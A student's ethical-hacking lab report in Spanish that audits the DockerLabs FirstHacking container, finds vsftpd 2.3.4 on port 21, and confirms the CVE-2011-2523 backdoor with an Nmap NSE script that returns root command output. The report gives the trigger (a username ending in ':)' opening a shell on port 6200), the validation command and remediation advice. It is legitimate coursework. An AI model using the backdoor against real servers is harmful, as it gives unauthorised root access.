# Práctica 01 - FirstHacking (DockerLabs) / HACK-P01-2026

## 1. Identificación y objetivo

- **Autor:** Pablo Sánchez
- **Asignatura:** Hacking Ético
- **Máquina y plataforma:** FirstHacking (DockerLabs), dificultad Muy Fácil. Autor original: comunidad DockerLabs
- **URL de procedencia:** https://dockerlabs.es (máquina FirstHacking, filtrada por dificultad "Muy Fácil")
- **Fecha y zona horaria:** 16/10/2026, de 18:56 a 19:29 aprox. (CEST)
- **Versión del informe:** v1.1 - 21/10/2026 (revisión tras correcciones del profesor)
- **Tratamiento de la información:** Informe de uso interno para la asignatura. No contiene datos personales reales ni información sensible fuera del laboratorio.

**Objetivo:** Desplegar el contenedor FirstHacking en un entorno Docker sobre Debian (WSL2), identificar los servicios expuestos y comprobar, de forma controlada, si existe alguna vulnerabilidad conocida.

**Criterio de finalización:** Conseguir y documentar ejecución remota de comandos con identidad root mediante el hallazgo validado.

**Resumen ejecutivo:** Se desplegó el contenedor FirstHacking y, al escanear sus puertos, solo apareció abierto el 21 (FTP, vsftpd 2.3.4). Se identificó que esa versión corresponde a una copia troyanizada conocida (CVE-2011-2523) y se validó con un script de Nmap que el backdoor está activo: permite ejecutar los comandos `id` y `hostname` con identidad root, sin autenticación. Como límite, solo se comprobó el backdoor mediante el script de Nmap; no se abrió una sesión interactiva manual. La medida prioritaria es actualizar o eliminar ese servicio FTP.

---

## 2. Entorno y alcance

**Autorización:** Enunciado de la Práctica 01 de la asignatura: desplegar y auditar la máquina FirstHacking de DockerLabs dentro de un contenedor Docker propio, en un entorno aislado y controlado por el alumno.

**Activos, IP y servicios autorizados:** Contenedor Docker `practica01-firsthacking`, IP interna `172.18.0.2`. Servicio autorizado: el propio contenedor desplegado.

**Sistemas excluidos:** Queda excluida cualquier máquina que no sea el contenedor propio (host Windows, otros contenedores o redes). No se autoriza ninguna acción destructiva fuera del laboratorio.

**Ventana de trabajo:** Sesión del 16/10/2026, de 18:56 a 19:29 CEST aproximadamente. Se da por finalizada al completar el hallazgo (paso 7) y al cerrar y empaquetar el laboratorio (paso 8).

**Conocimiento inicial:** Caja negra. No se partió de credenciales ni de conocimiento previo del contenedor, solo de su IP interna una vez desplegado.

**Entorno técnico:**

Desde Windows accedo a Debian mediante `wsl -d Debian`. Dentro de Debian ejecuto Docker Engine y Nmap. Docker Engine gestiona el contenedor FirstHacking (imagen `firsthacking:latest`, 558 MB).

```text
Windows
└── WSL 2
    └── Debian
        ├── Nmap y archivos de la práctica
        └── Docker Engine
            └── Contenedor FirstHacking
```

**Herramientas utilizadas:**

| Herramienta | Versión | Función |
|---|---|---|
| Docker Engine | - | Gestión de contenedores e imágenes |
| Nmap | 7.95 | Escaneo de puertos y scripts NSE |
| unzip | - | Descompresión del material de origen |

**Archivo de origen:** `firsthacking.zip` descargado de DockerLabs, que contenía `firsthacking.tar` y el script `auto_deploy.sh`.

---

## 3. Procedimiento realizado

**Método:** Metodología típica de auditoría caja negra: 1) despliegue del entorno, 2) descubrimiento de puertos con Nmap, 3) identificación del servicio y versión, 4) búsqueda de vulnerabilidades conocidas, 5) validación controlada con Nmap, 6) documentación del hallazgo, 7) propuesta de corrección, 8) empaquetado y verificación de la entrega.

### 3.1 Despliegue del entorno

Instalación de Debian vía WSL2 (`wsl --install -d Debian`) y acceso al sistema:

```text
C:\Users\Administrador>wsl -d Debian
pablo@TIC217:/mnt/c/Users/Administrador$
```

Preparación de Docker Engine en Debian (instalación, arranque y comprobación del servicio).

Descarga de FirstHacking desde DockerLabs (filtro "Muy Fácil") y descompresión del ZIP en `~/HackEtiLabs/docker/practica-01-firsthacking/origen`, obteniendo `firsthacking.tar` y `auto_deploy.sh`.

> **Nota sobre avisos del antivirus:** si Windows bloquea la descarga o detecta un archivo como amenaza, se detiene ese paso y se consulta al profesor, indicando el archivo afectado y el aviso recibido. No se desactiva la protección ni se restauran archivos bloqueados por cuenta propia. (En esta práctica no se produjo ningún aviso de este tipo.)

### 3.2 Carga de la imagen y creación de la red

```bash
sudo docker load -i firsthacking.tar
sudo docker images
```

```text
IMAGE               ID             DISK USAGE   CONTENT SIZE
firsthacking:latest 0e5b50e33295   558MB        273MB
hello-world:latest  11a3eb1597e8   25.9kB       9.49kB
```

Creación de la red interna de la práctica:

```bash
sudo docker network create --internal practica01-red
```

### 3.3 Arranque del contenedor objetivo

El contenedor `practica01-firsthacking` ya existía de una sesión anterior y aparecía detenido:

```bash
sudo docker ps -a
```

```text
CONTAINER ID   IMAGE                 STATUS
0cf9fccc3040   firsthacking:latest   Exited (255) 21 minutes ago
```

Se arranca con:

```bash
sudo docker start practica01-firsthacking
sudo docker ps
```

```text
CONTAINER ID   IMAGE                 STATUS
0cf9fccc3040   firsthacking:latest   Up 11 seconds
```

> Crear la red no conecta automáticamente a ella un contenedor que ya existía previamente. Se comprobó la red real a la que está conectado el objetivo (no se dedujo solo por la IP):

```bash
sudo docker inspect -f '{{json .NetworkSettings.Networks}}' practica01-firsthacking
```

Obtención de la IP objetivo:

```bash
IP_OBJETIVO=$(sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' practica01-firsthacking)
echo "$IP_OBJETIVO"
# 172.18.0.2
```

### 3.4 Descubrimiento de puertos

```bash
nmap -sT -p- --open -n -Pn -oN evidencias/nmap/01-puertos.txt "$IP_OBJETIVO"
```

```text
PORT   STATE SERVICE
21/tcp open  ftp
```

Único puerto TCP abierto: el 21 (FTP).

### 3.5 Identificación del servicio y versión

Identificación de servicio y versión en `evidencias/nmap/02-servicio-ftp.txt` (comando recogido en `archivos/comandos.txt`): vsftpd 2.3.4.

### 3.6 Búsqueda de vulnerabilidades conocidas

**Registro — CVE-2011-2523**

| Dato | Detalle |
|---|---|
| Programa y versión | vsftpd 2.3.4 (detectado por nmap en el puerto 21) |
| Vulnerabilidad | Backdoor en una copia troyanizada de vsftpd 2.3.4. Conectando con un usuario terminado en `:)` se abre una shell en el puerto 6200, sin login correcto |
| CVE | CVE-2011-2523 |
| Condiciones | Que sea la copia comprometida (no todas las 2.3.4 lo son, solo las descargadas en unos días concretos de 2011), que el puerto 21 esté accesible y que el 6200 no esté bloqueado |
| Fuente | Script `ftp-vsftpd-backdoor.nse` de Nmap |

### 3.7 Validación controlada

```bash
nmap -n -Pn -p 21 \
  --script ftp-vsftpd-backdoor \
  --script-args 'ftp-vsftpd-backdoor.cmd=hostname' \
  -oN evidencias/nmap/03-validacion.txt \
  "$IP_OBJETIVO"
```

Resultado relevante:

```text
VULNERABLE:
  vsFTPd version 2.3.4 backdoor
    State: VULNERABLE (Exploitable)
    Shell command: id
      Results: uid=0(root) gid=0(root) groups=0(root)
    Shell command: hostname
      Results: 0cf9fccc3040
```

El script marcó el servicio como VULNERABLE y, al enviar los comandos `id` y `hostname` a través del backdoor, el servidor respondió como root y devolvió el hostname `0cf9fccc3040`.

Comparación del hostname obtenido con el configurado en Docker:

```bash
sudo docker inspect -f '{{.Config.Hostname}}' practica01-firsthacking
# 0cf9fccc3040
```

El hostname devuelto por el backdoor coincide exactamente con el del contenedor auditado, confirmando que el acceso se obtuvo sobre la máquina objetivo y no sobre otra.

---

## 4. Comprobaciones y resultados

### Hallazgo H01 — Backdoor en vsftpd 2.3.4 troyanizado

| Campo | Detalle |
|---|---|
| Activo afectado | Contenedor `practica01-firsthacking` (172.18.0.2), servicio FTP (vsftpd) en el puerto 21 |
| Estado | Validado — 16/10/2026 |
| Referencia | CVE-2011-2523 |
| Evidencias | `01-puertos.txt`, `03-validacion.txt`, `04-reproduccion.txt` |

**Problema y causa:** Corre vsftpd 2.3.4, una versión en la que en 2011 se introdujo una puerta trasera en copias concretas del paquete. Conectando con un usuario que acabe en `:)` se abre una shell en el puerto 6200, sin contraseña.

**Impacto demostrado:** Se ha demostrado ejecución remota de los comandos `id` y `hostname` con identidad root dentro del contenedor, sin necesidad de usuario ni contraseña válidos. No se han probado otras acciones ni acceso al Debian anfitrión o a Windows.

**Severidad:** Alta — ejecución remota de comandos con identidad root sin autenticación, mediante una puerta trasera conocida. (No se detalla una puntuación CVSS porque no se ha calculado el vector completo para este caso; la gravedad queda justificada por el propio impacto demostrado.)

**Corrección propuesta (para un sistema real):** Sustituir el componente comprometido por una versión de vsftpd mantenida y confiable (repositorio oficial o gestor de paquetes de Debian), o retirar el servicio FTP si no es necesario. No se ha aplicado la corrección en este laboratorio.

**Verificación posterior (propuesta):** Relanzar el mismo escaneo con el script `ftp-vsftpd-backdoor` y comprobar que ya no marca el servicio como vulnerable, que el puerto 6200 no responde, y que el FTP (si se mantiene) sigue funcionando con un login normal.

### Qué demuestra cada evidencia

- `01-puertos.txt`: único servicio expuesto es FTP (puerto 21).
- `03-validacion.txt`: el backdoor está activo y permite ejecutar comandos como root sin autenticación.
- `04-reproduccion.txt`: tras repaquetar la imagen, el contenedor nuevo sigue ejecutando vsftpd 2.3.4.

**Qué queda sin demostrar:** El acceso interactivo manual por el puerto 6200 (no se abrió una shell a mano; se usó únicamente el script automático de Nmap). No era necesario para completar la práctica: la prueba prevista era la validación mediante Nmap, y las evidencias contienen los resultados de los comandos solicitados.

### Preguntas de reflexión

**Paso 4.**
- ¿Puerto abierto? 21/tcp.
- ¿Servicio? FTP.
- ¿Programa y versión? vsftpd 2.3.4.
- ¿Qué comprobar antes de afirmar la vulnerabilidad? Que esa copia concreta de vsftpd 2.3.4 sea realmente la troyanizada de 2011; el número de versión por sí solo no lo demuestra.

**Paso 5.**
- Observado: puerto 21 abierto y vsftpd 2.3.4 en ejecución. Sospecha (no confirmada aún en ese momento): que esa copia tuviera el backdoor.
- Condición a comprobar: que, al conectar con un usuario terminado en `:)`, se abra una shell en el puerto 6200 sin login.

**Paso 6.**
- Resultado que respalda la ejecución de comandos: el script `ftp-vsftpd-backdoor` marcó el servicio como VULNERABLE (Exploitable) y mostró la salida real de `id` y `hostname`.
- Identidad mostrada: `uid=0(root) gid=0(root) groups=0(root)`.
- Hostname devuelto y coincidencia: `0cf9fccc3040`, coincide exactamente con el hostname real del contenedor (`docker inspect`).
- Qué se puede afirmar / qué queda sin demostrar: se puede afirmar que el backdoor permite ejecutar comandos con identidad root sin contraseña; queda sin demostrar la conexión manual al puerto 6200, al haberse usado solo el script automático.

**Paso 7.**
- Parte demostrada: ejecución de comandos como root a través del backdoor. Sin comprobar: si desde ese acceso se podría llegar a otros recursos fuera del contenedor.
- Cómo eliminar la causa: sustituyendo vsftpd 2.3.4 por una versión oficial actualizada, o retirando el servicio FTP si no es necesario.
- Cómo verificar la corrección sin confundir un fallo de conexión con una solución: repitiendo el escaneo del backdoor y comprobando que ya no sale como vulnerable, que el puerto 6200 no responde, y que el FTP (si se mantiene) sigue funcionando con login normal.

**Paso 8.**
- Se comprobó que, tras cargar la imagen empaquetada y crear un contenedor nuevo, el servicio sigue siendo vsftpd 2.3.4 (ver `04-reproduccion.txt`). No se repitió la explotación del backdoor sobre ese contenedor ni se probó el paquete en otro equipo; esta comprobación corresponde a lo solicitado en el paso 8.

---

## 5. Problemas encontrados y soluciones

### Incidencia I01 — Contenedor detenido al iniciar

**Síntoma:** Al listar los contenedores con `docker ps -a`, `practica01-firsthacking` aparecía en estado `Exited`, sin IP asignada.

**Comprobación:** Se verificó el estado con `docker ps -a`, confirmando `Exited`.

**Causa:** El contenedor simplemente no estaba arrancado (se había quedado detenido de la sesión anterior); no era un problema de configuración ni de red.

**Solución:** Se arrancó con `docker start practica01-firsthacking` y se comprobó que pasaba a `Up`. Con el contenedor activo se obtuvo su IP (172.18.0.2) y se inició el escaneo con Nmap.

No hubo otras incidencias relevantes durante la práctica.

---

## 6. Contenido de la entrega e instrucciones de reproducción

### Inventario

```text
practica-01-firsthacking/
├── README.md
├── imagen/
│   └── laboratorio.tar
├── archivos/
│   └── comandos.txt
└── evidencias/
    └── nmap/
        ├── 01-puertos.txt
        ├── 02-servicio-ftp.txt
        ├── 03-validacion.txt
        └── 04-reproduccion.txt
```

- `imagen/laboratorio.tar`: imagen Docker de entrega, etiqueta `hacketilabs:practica01-firsthacking`.
- `archivos/comandos.txt`: comandos ejecutados durante la práctica.
- `evidencias/nmap/*.txt`: salidas de Nmap de cada fase.

**Nota:** se excluyen del ZIP final `origen/firsthacking.zip`, el `.tar` original descargado y los archivos auxiliares `Zone.Identifier`.

### Requisitos

Docker Engine funcionando sobre Debian (WSL2 en Windows).

### Reproducción desde cero

Pasos para reproducir el hallazgo en un entorno limpio, sin recursos previos con estos nombres:

```bash
sudo docker load -i imagen/laboratorio.tar

sudo docker network create --internal practica01-red

sudo docker run -dit \
  --name practica01-comprobacion \
  --network practica01-red \
  hacketilabs:practica01-firsthacking

IP_OBJETIVO=$(sudo docker inspect \
  -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' \
  practica01-comprobacion)

echo "$IP_OBJETIVO"

test -n "$IP_OBJETIVO" && \
nmap -sV -p 21 -n -Pn "$IP_OBJETIVO"

sudo docker stop practica01-comprobacion
sudo docker ps -a
```

**Qué revisar en el resultado:**
- IP asignada al contenedor nuevo.
- El escaneo debe identificar FTP / vsftpd 2.3.4 en el puerto 21.
- El contenedor debe quedar en estado `Exited` tras el `docker stop` final.

Esta reproducción ya se realizó (ver evidencia `04-reproduccion.txt`, contenedor `practica01-comprobacion`); no es necesario repetirla solo para generar una nueva captura.

---

## 7. Conclusiones y fuentes

**Cumplimiento del objetivo:** Se desplegó la máquina, se identificó el único servicio expuesto (FTP) y se validó de forma controlada una vulnerabilidad real (CVE-2011-2523), demostrando ejecución remota de comandos con identidad root. Como límite, no se explotó manualmente el backdoor por el puerto 6200 ni se profundizó más allá del acceso inicial demostrado por Nmap.

**Plan de mejora:**

| Hallazgo | Acción | Prioridad | Responsable | Plazo | Estado |
|---|---|---|---|---|---|
| H01 | Actualizar o retirar vsftpd 2.3.4 | Alta | Administrador del contenedor | Inmediato | Pendiente de aplicar (no se parcheó el contenedor de laboratorio) |

**Aprendizaje:** La importancia de comprobar la versión exacta de un servicio antes de darlo por seguro, y el uso de scripts NSE de Nmap para validar vulnerabilidades sin necesidad de explotación manual.

**Fuentes:**

- MITRE/NVD — CVE-2011-2523. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523 — consultado 16/10/2026. Respalda la identificación del backdoor.
- Nmap NSE — documentación del script `ftp-vsftpd-backdoor`. https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html — consultado 16/10/2026. Respalda el comportamiento y los parámetros del script utilizado en la validación.
- DockerLabs — máquina FirstHacking. https://dockerlabs.es — origen del laboratorio.

**Ayuda recibida:** Se usó Claude como apoyo para redactar y estructurar este informe a partir de las notas y capturas propias de la práctica. Todo el contenido técnico (comandos, resultados y hallazgo) ha sido revisado y corresponde a la ejecución real del laboratorio.

**Control de cambios:**

| Versión | Fecha | Cambio | Autoría |
|---|---|---|---|
| v1.0 | 16/10/2026 | Creación del informe a partir de las notas de la práctica | Pablo Sánchez |
| v1.1 | 21/10/2026 | Revisión tras correcciones del profesor: informe unificado, corrección de terminología (Debian/contenedor/red), ajuste del impacto demostrado, retirada de CVSS, unificación de conclusiones de reproducción, fuente de Metasploit sustituida | Pablo Sánchez |
